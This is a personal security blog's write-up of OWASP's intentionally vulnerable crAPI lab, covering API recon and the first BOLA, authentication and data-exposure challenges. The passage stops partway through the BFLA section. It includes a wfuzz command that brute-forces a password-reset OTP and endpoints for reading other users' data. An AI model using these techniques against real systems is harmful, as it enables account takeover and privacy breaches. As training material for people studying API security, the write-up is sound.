<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Vulnerable Lab by OWASP - crAPI (Writeup)" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post is all about the crAPI which is OWASP’s vulnerable web API application. It has few challenges across all TOP 10 API Vulnerabilities. In total 15 challenges/vulnerabilities and 2 secret ones." /><meta property="og:description" content="Intro This post is all about the crAPI which is OWASP’s vulnerable web API application. It has few challenges across all TOP 10 API Vulnerabilities. In total 15 challenges/vulnerabilities and 2 secret ones." /><link rel="canonical" href="https://an9k0r.github.io/posts/crAPI_writeup/" /><meta property="og:url" content="https://an9k0r.github.io/posts/crAPI_writeup/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-21T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vulnerable Lab by OWASP - crAPI (Writeup)" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post is all about the crAPI which is OWASP’s vulnerable web API application. It has few challenges across all TOP 10 API Vulnerabilities. In total 15 challenges/vulnerabilities and 2 secret ones.","headline":"Vulnerable Lab by OWASP - crAPI (Writeup)","dateModified":"2023-01-22T18:45:07+01:00","url":"https://an9k0r.github.io/posts/crAPI_writeup/","datePublished":"2022-12-21T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/crAPI_writeup/"},"@context":"https://schema.org"}</script><title>Vulnerable Lab by OWASP - crAPI (Writeup) | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Vulnerable Lab by OWASP - crAPI (Writeup)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Vulnerable Lab by OWASP - crAPI (Writeup)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-12-21 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 21, 2022, 8:00 AM +0100" >Dec 21, 2022</em> </span> <span> Updated <em class="timeago" date="2023-01-22 18:45:07 +0100 " data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 22, 2023, 6:45 PM +0100" >Jan 22</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2651 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post is all about the crAPI which is <a href="https://github.com/OWASP/crAPI">OWASP’s vulnerable web API application</a>. It has few <a href="https://github.com/OWASP/crAPI/blob/develop/docs/challenges.md">challenges</a> across all TOP 10 API Vulnerabilities. In total 15 challenges/vulnerabilities and 2 secret ones.</p><blockquote><p><strong>Overview - crAPI</strong></p><p>At a high level, the crAPI application is modeled as a B2C application that allows any user to get their car servicing done by a car mechanic. A user can create an account on the WebApp, manage his/her cars, search for car mechanics, submit servicing request for any car, and purchase car accessories from the vendor. The WebApp also has a community section where users can contribute with blog posts and comments.</p><p>The crAPI application, by design, does not implement all of its functionalities in the most secure manner. In other words, it deliberately exposes security vulnerabilities that can be exploited by any security enthusiast who is playing with the application. For more details on the vulnerabilities see the challenges.md</p><p>Source: https://github.com/OWASP/crAPI/blob/develop/docs/overview.md</p></blockquote><hr /><p><strong>The Plan</strong></p><p>I’ll start with recon (for completion purposes) and then i’ll document each finding under each vulnerability type.</p><p>I’ll be using Kali Linux and following tools:</p><ul><li>Burp Suite Community<li>Postman<li>ffuf<li>wfuzz<li>jwt_token</ul><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#recon">Recon</a><ul><li><a href="#setting-up-postman-to-reverse-engineer-an-api">Setting up Postman to Reverse Engineer an API</a><li><a href="#mitmproxy-and-swagger-creation">Mitmproxy and Swagger creation</a></ul><li><a href="#challenges">Challenges</a><ul><li><a href="#1-bola">1. BOLA</a><ul><li><a href="#challenge-1---access-details-of-another-users-vehicle">Challenge 1 - Access details of another user’s vehicle</a><li><a href="#challenge-2---access-mechanic-reports-of-other-users">Challenge 2 - Access mechanic reports of other users</a></ul><li><a href="#2-broken-user-authentication">2. Broken User Authentication</a><ul><li><a href="#challenge-3---reset-the-password-of-a-different-user">Challenge 3 - Reset the password of a different user</a></ul><li><a href="#3-excessive-data-exposure">3. Excessive Data Exposure</a><ul><li><a href="#challenge-4---find-an-api-endpoint-that-leaks-sensitive-information-of-other-users">Challenge 4 - Find an API endpoint that leaks sensitive information of other users</a><li><a href="#challenge-5---find-an-api-endpoint-that-leaks-an-internal-property-of-a-video">Challenge 5 - Find an API endpoint that leaks an internal property of a video</a></ul><li><a href="#4-rate-limiting">4. Rate Limiting</a><ul><li><a href="#challenge-6---perform-a-layer-7-dos-using-contact-mechanic-feature">Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature</a></ul><li><a href="#5-bfla">5. BFLA</a><ul><li><a href="#challenge-7---delete-a-video-of-another-user">Challenge 7 - Delete a video of another user</a></ul><li><a href="#6-mass-assignment">6. Mass Assignment</a><ul><li><a href="#challenge-8---get-an-item-for-free">Challenge 8 - Get an item for free</a><li><a href="#challenge-9---increase-your-balance-by-1000-or-more">Challenge 9 - Increase your balance by $1,000 or more</a><li><a href="#challenge-10---update-internal-video-properties">Challenge 10 - Update internal video properties</a></ul><li><a href="#7-injections">7. Injections</a><ul><li><a href="#ssrf---challenge-11---make-crapi-send-an-http-call-to-wwwgooglecom-and-return-the-http-response">(SSRF) - Challenge 11 - Make crAPI send an HTTP call to “www.google.com” and return the HTTP response.</a><li><a href="#nosqli---challenge-12---find-a-way-to-get-free-coupons-without-knowing-the-coupon-code">(NoSQLi) - Challenge 12 - Find a way to get free coupons without knowing the coupon code.</a><li><a href="#sqli---challenge-13---find-a-way-to-redeem-a-coupon-that-you-have-already-claimed-by-modifying-the-database">(SQLi) - Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database</a><ul><li><a href="#getting-databases">Getting Databases</a><li><a href="#getting-tables-all">Getting Tables (all)</a><li><a href="#getting-columns-from-user_details">Getting columns from <code class="language-plaintext highlighter-rouge">user_details</code></a><li><a href="#finding-applied-coupons-columns">Finding applied coupons columns</a><li><a href="#dumping-applied-coupon-table">Dumping applied coupon table</a><li><a href="#changing-values-in-the-row-updatedelete">Changing Values in the row UPDATE/DELETE</a></ul><li><a href="#unauthenticated-access---challenge-14---find-an-endpoint-that-does-not-perform-authentication-checks-for-a-user">(Unauthenticated Access) - Challenge 14 - Find an endpoint that does not perform authentication checks for a user.</a><li><a href="#vulnerable-jwt---challenge-15---find-a-way-to-forge-valid-jwt-tokens">(Vulnerable JWT) - Challenge 15 - Find a way to forge valid JWT Tokens</a><ul><li><a href="#algorithm-confusion">Algorithm Confusion</a><li><a href="#invalid-signature-vulnerability">Invalid Signature Vulnerability</a><li><a href="#jku-misuse-vulnerability">JKU Misuse Vulnerability</a><li><a href="#kid-path-traversal-vulnerability">KID Path Traversal Vulnerability</a></ul></ul></ul></ul><h1 id="recon">Recon</h1><p>First of all, we should be able to get onto login page if our crAPI instance is working as intended:</p><p><img data-src="/assets/images/a87775a3b848eb5936e581b443b99f18b65085d6bc5169d3b20e121de90f6e2b.png" alt="picture 1" data-proofer-ignore></p><p><em>I’ve named the instance crapi.local</em></p><p>Let’s have a Burp (or other proxy) running and let’s sign up and login.</p><p><img data-src="/assets/images/e3511b39145c04220994233e9a4700d573e7d4aba02268a457e2b8d1da7c8bdb.png" alt="picture 2" data-proofer-ignore></p><p>We can notice in the requests that there are some signs of API that’re being used:</p><p><img data-src="/assets/images/12e4a1a385f7aa75aff9bcf982c152a8b0bb9bc7a56e742b14ee657b3c08b2a0.png" alt="picture 3" data-proofer-ignore></p><p>We can see that Sitemap has been populated with those paths as well.</p><p><img data-src="/assets/images/1224864fb98c80bebca48c51de7333967ad2b8fcf7f27c3d7571aa0a7767a5c2.png" alt="picture 4" data-proofer-ignore></p><p>Obviously we cannot say for sure that this is the only endpoint out there.</p><p>We can do <strong>wordlist directory enumeration</strong> with tools like gobuster, wfuzz or FFUF. I like FFUF the most so i’ll run FFUF against the target using <code class="language-plaintext highlighter-rouge">swagger-wordlist.txt</code> from <a href="https://wordlists.assetnote.io">assetnote</a></p><p><img data-src="/assets/images/371b8fe3581ad57c321ac2af8e72164baedfbcef64b405a4cff0c19d172e6fdf.png" alt="picture 5" data-proofer-ignore></p><p>The problem at this point is that i see different status codes and cannot sort them out immediately.</p><blockquote><p>It is important to get understanding how APP (or Web Application) work. In the next chapter i’ll run the app and reverse engineer the API.</p></blockquote><h2 id="setting-up-postman-to-reverse-engineer-an-api">Setting up Postman to Reverse Engineer an API<a href="#setting-up-postman-to-reverse-engineer-an-api" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This are basic settings:</p><p><img data-src="/assets/images/d4681c0282e73175afdde720c3aed21f8c7960bd14ed2621911e6afdf626acad.png" alt="picture 6" data-proofer-ignore></p><p>I’ve also set an additional filter to my url <code class="language-plaintext highlighter-rouge">crapi.local</code>. I’ve also filtered out <code class="language-plaintext highlighter-rouge">.css,.map,.js</code>… Oh and don’t forget to setup browser to the right proxy afterwards.</p><blockquote><p>For emails that are being sent from the app itself, you should be able to read them on port 8025 where <code class="language-plaintext highlighter-rouge">MailHog</code> is running</p></blockquote><p>We can add requests to collection (if we’ve chosen our requests to <code class="language-plaintext highlighter-rouge">History</code> and not the collection itself)</p><p><img data-src="/assets/images/5b938f0906276dcdf53ae1e08c5cc4e913a9db0c90f846999f74a6a59147e1f6.png" alt="picture 7" data-proofer-ignore></p><p>… This is what we have so far:</p><p><img data-src="/assets/images/c57447185f59be15c7f83dc603b40574ee25e8c3772df508ea154b56357d5108.png" alt="picture 8" data-proofer-ignore></p><blockquote><p>We have to decide if this kind of documentation and reversing process is viable for us or not. Considering the size of the API for <code class="language-plaintext highlighter-rouge">crAPI</code> application, we can sort and document the endpoints by hand.</p></blockquote><p>There is not a single way how to document the API, but we can take existing documentation as a reference. We can take a look at <code class="language-plaintext highlighter-rouge">Explore</code> function in our Postman.</p><p><img data-src="/assets/images/1e970481047de16320587ed15d10d63fb54f3493b9e05761f7884738c5bc975c.png" alt="picture 9" data-proofer-ignore></p><h2 id="mitmproxy-and-swagger-creation">Mitmproxy and Swagger creation<a href="#mitmproxy-and-swagger-creation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s run all requests again by browsing the app and pipe them through <a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></p><p>I’ve ran <code class="language-plaintext highlighter-rouge">mitmweb</code> using <code class="language-plaintext highlighter-rouge">-w</code> option which writes flows into a file and i’ve used another port then default <code class="language-plaintext highlighter-rouge">8090</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mitmweb --listen-port 8090 -w crapi_flow
</pre></table></code></div></div><p>We should get a list of requests and should look like this:</p><p><img data-src="/assets/images/522eb60e8e75178410789b83d0ac0b306dcf9909641861737f6de3e592554051.png" alt="picture 11" data-proofer-ignore></p><p>After we’re done we can save the flows (we can also set filter e.g., <code class="language-plaintext highlighter-rouge">/api</code>) and run <code class="language-plaintext highlighter-rouge">mitmproxy2swagger</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mitmproxy2swagger -i flows -o swagger.yaml --examples -f flow -p "http://crapi.local:8888"
</pre></table></code></div></div><p>We can import swagger file to an editor or into postman directly. There is also online instance running at <code class="language-plaintext highlighter-rouge">https://editor.swagger.io</code> where we can upload YAML and edit it.</p><p><img data-src="/assets/images/c7e67b8e48686eadcfd72de336747052bd5e7e622f9f22807e383e6093eec05b.png" alt="picture 13" data-proofer-ignore></p><blockquote><p>If we would just want the list of endpoints, we could just use <code class="language-plaintext highlighter-rouge">mitmproxy2swagger -i flows -o swagger_no_examples.yaml -f flow -p "http://crapi.local:8888"</code> without <code class="language-plaintext highlighter-rouge">--examples</code> tag.</p></blockquote><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre> luka@yokai  ~/crapi_vapi  cat swagger_no_examples.yaml 
openapi: 3.0.0
info:
  title: flows Mitmproxy2Swagger
  version: 1.0.0
servers:
- url: http://crapi.local:8888
  description: The default server
paths: {}
x-path-templates:
# Remove the ignore: prefix to generate an endpoint with its URL
# Lines that are closer to the top take precedence, the matching is greedy
- ignore:/community/api/v2/community/posts
- ignore:/community/api/v2/community/posts/recent
- ignore:/community/api/v2/community/posts/v6HRovghs98ZdmzcBdaY7B
- ignore:/community/api/v2/community/posts/v6HRovghs98ZdmzcBdaY7B/comment
- ignore:/community/api/v2/coupon/validate-coupon
- ignore:/identity/api/auth/login
- ignore:/identity/api/auth/signup
- ignore:/identity/api/v2/user/change-email
- ignore:/identity/api/v2/user/dashboard
- ignore:/identity/api/v2/user/pictures
- ignore:/identity/api/v2/user/reset-password
- ignore:/identity/api/v2/user/verify-email-token
- ignore:/identity/api/v2/user/videos
- ignore:/identity/api/v2/user/videos/{id}
- ignore:/identity/api/v2/user/videos/29
- ignore:/identity/api/v2/user/videos/convert_video
- ignore:/identity/api/v2/vehicle/add_vehicle
- ignore:/identity/api/v2/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location
- ignore:/identity/api/v2/vehicle/resend_email
- ignore:/identity/api/v2/vehicle/vehicles
- ignore:/workshop/api/mechanic
- ignore:/workshop/api/mechanic/
- ignore:/workshop/api/merchant/contact_mechanic
- ignore:/workshop/api/shop/orders
- ignore:/workshop/api/shop/orders/{id}
- ignore:/workshop/api/shop/orders/2
- ignore:/workshop/api/shop/orders/all
- ignore:/workshop/api/shop/orders/return_order
- ignore:/workshop/api/shop/products
- ignore:/workshop/api/shop/return_qr_code
</pre></table></code></div></div><p>I really like to have a list like this in front of me. What do we see almost immediately? E.g., <code class="language-plaintext highlighter-rouge">/workshop</code> does not use <code class="language-plaintext highlighter-rouge">/v2/</code>. This is also a good base to create a wordlist using endpoints above.</p><p>If we upload our <code class="language-plaintext highlighter-rouge">swagger.json</code> to the <code class="language-plaintext highlighter-rouge">Postman</code>, we’ll see that it’s very well ordered:</p><p><img data-src="/assets/images/a940ec2e938f461fb68f7dcb1bb92895f963c54fe1c6cfe9c87fb19c24389383.png" alt="picture 14" data-proofer-ignore></p><h1 id="challenges">Challenges</h1><h2 id="1-bola">1. BOLA<a href="#1-bola" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>If this was rewal engagement, it would be wise or necesarry to add an additional user which we could attack.</p></blockquote><h3 id="challenge-1---access-details-of-another-users-vehicle">Challenge 1 - Access details of another user’s vehicle<a href="#challenge-1---access-details-of-another-users-vehicle" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We have to pay attention to where we can read other users data. Most obvious would be any kind of IDs.</p><p>One such request is <code class="language-plaintext highlighter-rouge">/identity/api/v2/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location</code>.</p><p><img data-src="/assets/images/8ad64324b2de0f5e0cbb9daf6889a761f3c296fc1d9ea012f5818d95f47c41f2.png" alt="picture 1" data-proofer-ignore></p><p>Although we cannot simply brute-force the UUID, we can find it elsewhere</p><p><img data-src="/assets/images/cecda7191ee647106c28327635c561658190ec7e7c4cdaad1f4c386c5c2903d2.png" alt="picture 2" data-proofer-ignore></p><p>And we can find cars location if we have knowledge of other cars UUID:</p><p><img data-src="/assets/images/1f9d7de35a287f65865f8708853943f3787bdf006dcfc5d7310d4e46d8c46249.png" alt="picture 3" data-proofer-ignore></p><ul><li>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/identity/api/v2/vehicle/9882ead6-1c5f-48eb-a0e7-408ffa0dbbf8/location</code></ul><h3 id="challenge-2---access-mechanic-reports-of-other-users">Challenge 2 - Access mechanic reports of other users<a href="#challenge-2---access-mechanic-reports-of-other-users" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>This BOLA vulnerability has been hidden on plain sight, as we first need to send a request for report where link will get generated</p><p><img data-src="/assets/images/c7cc16222654bf32984986322fb36fbd665ed35b5cb138280aa673a39b33a66b.png" alt="picture 4" data-proofer-ignore></p><ul><li>Request sent: <code class="language-plaintext highlighter-rouge">/workshop/api/mechanic/receive_report?mechanic_code=TRAC_JHN&amp;problem_details=repair&amp;vin=9XPLG11UTSQ720977</code></ul><p>This is a new endpoint which was unknown until now: /workshop/api/mechanic/mechanic_report`</p><ul><li>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/workshop/api/mechanic/mechanic_report?report_id=8</code></ul><p><img data-src="/assets/images/ab9dc9e0fcf0f3e7de3225b705fcf03b229ec6e26fb6dc752c19be3c5bd25bc8.png" alt="picture 5" data-proofer-ignore></p><h2 id="2-broken-user-authentication">2. Broken User Authentication<a href="#2-broken-user-authentication" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="challenge-3---reset-the-password-of-a-different-user">Challenge 3 - Reset the password of a different user<a href="#challenge-3---reset-the-password-of-a-different-user" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can reset password for any user (this is not a vulnerability!)</p><p><img data-src="/assets/images/e2a7f57878b368794d10aa5aba053e883e5c019efa848da08080f04f657079cb.png" alt="picture 7" data-proofer-ignore></p><p>Interestingly, there are 2 versions:</p><ul><li><code class="language-plaintext highlighter-rouge">/identity/api/auth/v2/check-otp</code> (found / guessed)<li><code class="language-plaintext highlighter-rouge">/identity/api/auth/v3/check-otp</code> (default)</ul><p>Long story short, <code class="language-plaintext highlighter-rouge">v2</code> is missing rate-limiting, so we can simply brute-force the OTP.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz -z range,0000-9999 -u http://crapi.local:8888/identity/api/auth/v2/check-otp -d '{"email": "victim@cybersec-research.space","otp":"FUZZ","password":"SSSaaasss!!!"}' -H "Content-Type: application/json" --hw 5 -v
</pre></table></code></div></div><p><img data-src="/assets/images/40f4d0ff1325746b046c550d080efa6570a367a849d85e6a240b27cec5e8d031.png" alt="picture 6" data-proofer-ignore></p><ul><li>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/identity/api/auth/v2/check-otp</code></ul><h2 id="3-excessive-data-exposure">3. Excessive Data Exposure<a href="#3-excessive-data-exposure" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="challenge-4---find-an-api-endpoint-that-leaks-sensitive-information-of-other-users">Challenge 4 - Find an API endpoint that leaks sensitive information of other users<a href="#challenge-4---find-an-api-endpoint-that-leaks-sensitive-information-of-other-users" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/images/7e2efd2e8cb24bce84b2aa542a6e9136280020c12df47eceb88c73a32357bb1f.png" alt="picture 15" data-proofer-ignore></p><p>Vulnerable Endpoint:</p><ul><li><code class="language-plaintext highlighter-rouge">/community/api/v2/community/posts/recent</code><li><code class="language-plaintext highlighter-rouge">/community/api/v2/community/posts/:{id}</code><li><code class="language-plaintext highlighter-rouge">/community/api/v2/community/posts/:{id}/comment</code></ul><p>At least information that’s marked in the screenshot, did not have to be exposed in the response.</p><h3 id="challenge-5---find-an-api-endpoint-that-leaks-an-internal-property-of-a-video">Challenge 5 - Find an API endpoint that leaks an internal property of a video<a href="#challenge-5---find-an-api-endpoint-that-leaks-an-internal-property-of-a-video" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/images/6e584a3c2ac84fe619d55466a4ffdedb855383564d46ce0d7274af40f850bc8c.png" alt="picture 16" data-proofer-ignore></p><p>Vulnerable Endpoint:</p><ul><li><code class="language-plaintext highlighter-rouge">/identity/api/v2/user/videos</code><li><code class="language-plaintext highlighter-rouge">/identity/api/v2/user/videos/:{id}</code></ul><h2 id="4-rate-limiting">4. Rate Limiting<a href="#4-rate-limiting" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="challenge-6---perform-a-layer-7-dos-using-contact-mechanic-feature">Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature<a href="#challenge-6---perform-a-layer-7-dos-using-contact-mechanic-feature" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><h2 id="5-bfla">5. BFLA<a href="#5-bfla" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Here we’re searching for basically the same as BOLA, just with a crucial difference - we’re not reading but changing stuff, so we might have to send other HTTP Verbs like <code class="language-plaintext highlighter-rouge">PUT, DELETE, POST</code>.</p><h3 id="challenge-7---delete-a-video-of-another-user">Challenge 7 - Delete a video of another user<a href="#challenge-7---delete-a-video-of-another-user" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>There were no endpoints found using <code class="language-plaintext highlighter-rouge">DELETE</code> HTTP Verb, but i haven’t yet been actively searching for them to.</p><p>When trying things around, following <code class="language-plaintext highlighter-rouge">endpoint</code> replies 